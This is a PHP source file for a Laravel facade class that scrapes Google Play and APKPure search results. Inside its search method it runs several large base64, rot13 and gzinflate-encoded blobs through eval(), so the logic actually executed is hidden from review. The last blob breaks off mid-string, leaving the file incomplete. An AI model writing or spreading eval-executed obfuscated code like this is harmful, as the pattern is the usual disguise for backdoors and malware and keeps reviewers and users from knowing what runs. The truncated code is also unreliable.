<?php

namespace App\Facades;


/**
 * Module Api: App\Facades\ApiFacade.php
 *
 * Long description for class (if any)...
 *
 * @package    DCM
 * @author     Anthony Pillos <dev.anthonypillos@gmail.com>
 * @copyright  2018 (c) DCM
 * @version    Release: v1.0.0
 * @link       http://devcorpmanila.com
 */

use Cache;
use Exception;
use Symfony\Component\DomCrawler\Crawler;
use GuzzleHttp\Client;
use GuzzleHttp\Exception\ClientException;
use GuzzleHttp\Exception\GuzzleException;

use Storage;
use Phamda;
use Facades\App\Facades\UserAgentFacade;

/**
 * Class ApiFacade
 *
 * @package namespace App\Facades;
 */
class ApiFacade
{

    private $url              = 'https://play.google.com';
    private $apkPureUrl       = 'https://apkpure.com';
    private $apkPureDetailUrl = 'https://apkpure.com/dcm/';

    public $opts = [
        'lang'          => 'en',
        'country'       => 'us',
        'price'         => ''
    ];

    private $webClient;

    /**
    * __construct()
    * Initialize our Class Here for Dependecy Injection
    *
    * @return void
    * @access  public
    **/
    public function __construct()
    {

        // $this->opts['lang'] = env('SET_LOCALE');
        $this->webClient = new Client([
            'headers' => [
                'Content-Type' => 'application/x-www-form-urlencoded;charset=UTF-8',
                'headers' => array('User-Agent' => UserAgentFacade::random())
            ]
        ]);
    }


    /**
    * setOptions()
    *
    *
    * @return void
    * @access  public
    **/
    public function setOptions($opt = [])
    {
        $opts = array_merge($this->opts,$opt);
        $this->opts = $opts;
        return $this;
    }

    /**
    * search()
    *
    * @return void
    * @access  public
    **/
    public function search($q)
    {

        try {

            $requestUri = $this->url . '/store/search?c=apps&q='.$q.'&hl='.$this->opts['lang']
                .'&gl='.$this->opts['country'];

            if ( env('DEMO_MODE_ON', false) === true) {
                $content = Storage::disk('public')->get('api.html');
            } else {
                $response = $this->webClient->get($requestUri);
                $content = $response->getBody()->getContents();
            }
            eval(str_rot13(gzinflate(str_rot13(base64_decode('LZbHEuy4DVK/c3eeasqhvEVJK+e0ZCnnLLXC1w/baa9VgCAa5MGltmlt/hzjN92fqd7+zEa1Edh/1nrJ1u1COWha+fx/8rf6REM7ExSH6xaECI5h8HBGXoglIxhuIc+NFVuaSbe1XDR2LQcxS/5P3KoXcpdmW2zTVGzHaA7YGmz8CzHZ4Tl5dwbzj1/oo5mxYJg/a2HriCFq0NWPfmq3gpPEYu2Un6UKF8T0hbwxrMi6p9Zt1VDaQuEOi2WFPRBala2Br9JZI/rTtgpksZe2MPPZVEms7DeF2AkV42ChUESwRF9P0sjy1B9SJV9ZWR39ZDMMUtrzPdGtiuBPBfXnwWh6Os0kMYz1IGvWa1NCgPW4MAyZxMQ9P/aQ/5Bcge0fIvWcoRawW/DHk+qDfVOs4OCMp4ISI8qnHHrjq6J7fXxQEa5j6Xj71dAa3/75unmKR0RnlGydmWQaEme91EPEDkiBvp1aa3g/21H04EqcfHW8SS0n5lYWguRK64jBz1pCb+x1eOZvISw5OBuYT9UhuJmPCT37TaVI6foOqD4Dp1+Oz1w0tB+l41SHoQQJEBoVhqZYDB4DfnW2DA8FAweF10GNS4QnHSiGCKZOufBE9FukM10xj85Juhu74Fk7QYI9curEv6+CJl3Sv0uLwURYpcoHGpAZrqNgcur2ZD2s1vRtwdUiU7E5vX3wpzSl4CiohEDK8EB/hplscl/Cms/bnEinPsv8qG6thyUB6ZWNGJS4toM/sEbBNdIz3QUI5fkYtQ5duV1fnwXeXRNTXzew2+VJNLLjiZjk6pzL4tGmLMozExGyD99m5EoF0SR7b4iYUkxzf3nhadBeC0RbqwW0dbkg9jH1vbtalL5bxDesaaKI6urhdLR9jPouTD1TJOHgcNGI6WVyzDV0YXbd/p7nuVEEKo+l1UB/CmF+WM0eryE6TCu5L0eKch2RLlYNw6Jg21OBRkE8qxR3yRj/OvL8CXBFa6WerrktxzVoNj4b1CrGVBgSQ9x64tFSBnxT5hjSAVCr9Wmo/PrpuujzpSEBEUERzMewPQpB3lTFAPWuwvpQTr/d0DNpWVdPbsGCg7D28Ob5jk6zE28+fDt2fmUHWtQsJQ4a1nmG7BOLhU85uePu78YiyJRcF9pFxSac53zx5AmL7AmWFkMtLf6HPvWoek1vw0PD2m/XBC7jyYfjI+Ais6lFC18uuEA3aHAK+Lo95xOf1zc5qQCOLh9txYAVCsch3k0XSAnWa7ZlUcxgqroTepIACQ7hMI3wC/d/LDB8HOj7jouYEu5y9T07YsxxMdQyzWTdZeRBrUUrJFM6xhGOtGfDeSMgwQ9/CZESVAXifuOx8UOWBufgjTsjRHu6OwsAypwAv8/De75XtaDUythKZKQQcaV8MdvpyKAyvbbKBnbQk+jy+pXWW4gbEHaTQP5cfRk+3arkmp+Omybuh+aNS1ymbWgywO3XDnVIs3NM7EioicB/Wtt8RwZM0xA3xzCYOCT3LH//noYG+/6pmyptt/iFj3qjustS+UrSpg5DtaojYRqqcVdqwc6w6QHW3TlDe7h67eDl8VJNFPloGoamvfdqCwMdn41/ebsctWP3DWW1b85SCy/uRwRW+sn3zYnD6EFRDMuXGO1xJRk9vkAJQHi8ArCHOgGN0/e60H+MVn6AEQVMeMNpHbTMxgEHGjHG9jJgovuC1lIO04eJf49A4ZWmtRs2AsbWjyE5rV6s+B4idPDWaPlBJ8utgZ3ThnxCZzoj6h1Cye0OgJXbl+aele3XW3/VaczvyGJVk3FfIxNqpLVjgxfx+OV2A6ljJRoGcAyxzmWem9TXDarWuj4oBaXBjoyB/H6uEKII6RpMVz8Q3SZJQShLxthnTOFTyhdxmC3Jk87Od1e86zFl6+yCv0yz8CLr27m9LrFI82uQPG1WaLZGVTVC9qY3QQVw0R0Hac8/coZ1E/pvA65VyY3tLg9ZeVXBrMpl+elvNy3gAiqO0Re+5Yo4oip8f6xvoUXB5G8hQtJ9UhXz8nFrn5arnjJpL0ZjouUSD7XOg13qOfrbOBxEAgH4Lw7aOliCal6qMn7GyGvx8RklloKF4aLMY/MKWtEBfK6dydBKe5AUR9s7W2rZAkbG10qXfeos/CmZQmqpcZIBl2LKDb/h0nE1RZNaqPfT1oWVB28jfjDMlfMgfAE5fjT8PhJeAmf/eT+1t58d6dxbggs0sMvor8/7kSSdGKUo5cd6SBoWm7yk9UDt+2YLjDBzdh8fpgEHNjwTVNcWn2wijQV/rVwwQVNRUukp4K9H7d8NC5LTESm7RbhC/XmZRS0qACn6PW0WtrpiIq5hKITaTtHrSijWk9+gd4kwJVqLnF1DvuC3YyahMl5pdI+CPlxs8IKZw1KcnRTKROdoCIKZFdKZJcFkBhW2faQMyP8OPL3KX3pAplygSKj997/A79//AA==')))));
            $processMatchData = $matches[0];
            $keyMatch         = [];
            $valueMatch       = [];
            $apps             = [];

            $allMatched = array_reduce($processMatchData, function($accum, $data) use($keyMatch, $valueMatch) {
                eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
                if ($keyMatch && $valueMatch) {
                    eval(str_rot13(gzinflate(str_rot13(base64_decode('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